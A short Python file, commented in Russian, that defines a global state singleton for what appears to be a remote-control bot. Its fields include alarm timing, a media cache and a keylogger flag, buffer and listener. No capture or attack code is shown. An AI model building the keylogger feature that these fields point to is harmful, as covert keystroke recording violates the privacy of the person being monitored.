class BotState:
    """Хранилище глобального состояния системы."""
    def __init__(self):
        self.security_mode = False
        self.last_alarm_time = 0.0
        self.alarm_cooldown = 5.0
        self.bot_loop = None
        self.bot_client = None
        
        self.media_cache = {}
        self.pending_downloads = {}

        # Кейлоггер
        self.keylog_active = False
        self.keylog_buffer = []
        self.keylog_listener = None

# Глобальный экземпляр состояния (Singleton)
state = BotState()